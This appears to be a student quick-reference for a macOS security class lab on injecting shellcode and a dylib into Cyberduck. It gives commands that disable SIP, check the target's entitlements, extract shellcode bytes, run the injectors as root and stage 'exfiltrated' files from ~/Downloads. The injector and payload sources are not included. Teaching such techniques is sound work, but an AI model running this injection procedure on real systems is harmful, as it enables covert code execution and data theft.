# Lab Quick-Reference: Mach Task Injection → Dylib Injection
### Mach Microkernel Master Class — Session 2

> **This is the student command reference.** All theory, explanations, and instructor notes are in `session_dylib_injection.md`.

---

## What We're Building Today

```
01_shellcode_inject/
    shellcode.asm           ← ARM64 execve payload
    cyberduck-inject.m      ← Shellcode injector (task_for_pid)

02_dylib_inject/
    loader.asm              ← Stage 1: bridges Mach thread → POSIX → dlopen
    toinject.c              ← The dylib payload
    cyberduck-inject-dylib.m ← Full dylib injector with patching engine
```

---

## Step 0: Get the Right Version of Cyberduck

> **CRITICAL**: You must use the **direct download** version from cyberduck.io —
> NOT the Mac App Store version. The App Store version is sandboxed and `task_for_pid`
> will fail even as root.

### Download

```bash
# Direct download — version 9.4.1
curl -L -o ~/Downloads/Cyberduck-9.4.1.44384.zip \
  https://update.cyberduck.io/Cyberduck-9.4.1.44384.zip

# Unzip and install
cd ~/Downloads
unzip Cyberduck-9.4.1.44384.zip
mv Cyberduck.app /Applications/
```

Or download manually: **https://update.cyberduck.io/Cyberduck-9.4.1.44384.zip**

### Verify It's the Right Version

```bash
# Must show TeamIdentifier=G69SCX94XU (iterate GmbH — the direct download build)
codesign -dv --entitlements - /Applications/Cyberduck.app 2>&1 | \
  grep -E "TeamIdentifier|disable-library-validation|app-sandbox"
```

**Expected output**:
```
TeamIdentifier=G69SCX94XU
<key>com.apple.security.app-sandbox</key><false/>
<key>com.apple.security.cs.disable-library-validation</key><true/>
```

If `TeamIdentifier` is not `G69SCX94XU` you have the App Store version. Delete it and use the zip above.

### Verify MD5

```bash
md5 ~/Downloads/Cyberduck-9.4.1.44384.zip
# Should be: 8ea827c448a7ca8fdea8d122145e41fb
```

---

## Step 1: VM Prerequisites

```bash
# Root is required. SIP must also be disabled in the VM.
#
# Why SIP? On macOS 14+ with SIP enabled, task_for_pid from root still fails
# against any process with Hardened Runtime (flags=0x10000). SIP has a specific
# task_for_pid restriction that blocks this. Cyberduck has Hardened Runtime.
#
# Verify SIP is off before starting:
csrutil status   # must say "disabled"
sudo -v          # confirm root works

# If SIP is enabled, reboot to Recovery Mode and run: csrutil disable
# Or to disable only the task_for_pid restriction: csrutil enable --without debug

# Create the staging directory for exfiltrated files
mkdir -p ~/Library/Colors/
```

---

## Lab 1 — Shellcode Injection (`01_shellcode_inject/`)

```bash
cd 01_shellcode_inject

# 1. Assemble shellcode
as shellcode.asm -o shellcode.o

# 2. Extract raw bytes and print as C array (use these to verify your shellcode.o)
OFFSET=$(otool -l shellcode.o | awk '/sectname __text/{f=1} f && /[[:space:]]offset[[:space:]]/{print $2; exit}')
SIZE_HEX=$(otool -l shellcode.o | awk '/sectname __text/{f=1} f && /[[:space:]]size[[:space:]]/{print $2; exit}')
SIZE_DEC=$(printf '%d' "$SIZE_HEX")
dd if=shellcode.o of=shellcode.bin bs=1 skip=$OFFSET count=$SIZE_DEC 2>/dev/null
xxd -i shellcode.bin

# 3. Compile injector
clang -framework Foundation -o cyberduck-inject cyberduck-inject.m

# 4. Launch Cyberduck, grab PID, inject
open /Applications/Cyberduck.app && sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
sudo ./cyberduck-inject $DUCK_PID

# 5. Verify
sleep 2 && ls ~/Library/Colors/
```

---

## Lab 2 — Dylib Injection (`02_dylib_inject/`)

```bash
cd 02_dylib_inject

# 1. Build the payload dylib
clang -dynamiclib -o inject.dylib toinject.c
cp inject.dylib ~/Library/Colors/inject.dylib

# 2. Assemble the loader shellcode
as loader.asm -o loader.o

# 3. Extract loader bytes — PASTE THIS OUTPUT into cyberduck-inject-dylib.m
OFFSET=$(otool -l loader.o | awk '/sectname __text/{f=1} f && /[[:space:]]offset[[:space:]]/{print $2; exit}')
SIZE_HEX=$(otool -l loader.o | awk '/sectname __text/{f=1} f && /[[:space:]]size[[:space:]]/{print $2; exit}')
SIZE_DEC=$(printf '%d' "$SIZE_HEX")
dd if=loader.o of=loader.bin bs=1 skip=$OFFSET count=$SIZE_DEC 2>/dev/null
xxd -i loader.bin

# 4. Paste xxd output into cyberduck-inject-dylib.m loader_shellcode[] array
#    Then compile:
clang -framework Foundation -o cyberduck-inject-dylib cyberduck-inject-dylib.m

# 5. Watch for log evidence in a second terminal:
#    log stream --style syslog --predicate 'eventMessage CONTAINS[c] "INJECTED"'

# 6. Launch fresh Cyberduck and inject
open /Applications/Cyberduck.app && sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
sudo ./cyberduck-inject-dylib $DUCK_PID ~/Library/Colors/inject.dylib
```

---

## Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| `task_for_pid` returns `KERN_FAILURE` | Not running as root | Run with `sudo` |
| `task_for_pid` returns `KERN_FAILURE` even as root | Targeting an Apple system process (CS_RESTRICT) | Cyberduck is a third-party app — this shouldn't happen. Confirm PID is Cyberduck, not a system daemon |
| Patching incomplete (dlopen/pthread not found) | Loader bytes not pasted in | Re-run `xxd -i loader.bin` and paste into `loader_shellcode[]` |
| Cyberduck crashes immediately on injection | App Store version (no `disable-library-validation`) | Use zip from cyberduck.io, verify `TeamIdentifier=G69SCX94XU` |
| `~/Library/Colors/` is empty after shellcode | `~/Downloads` was empty | Add a test file to `~/Downloads` first |

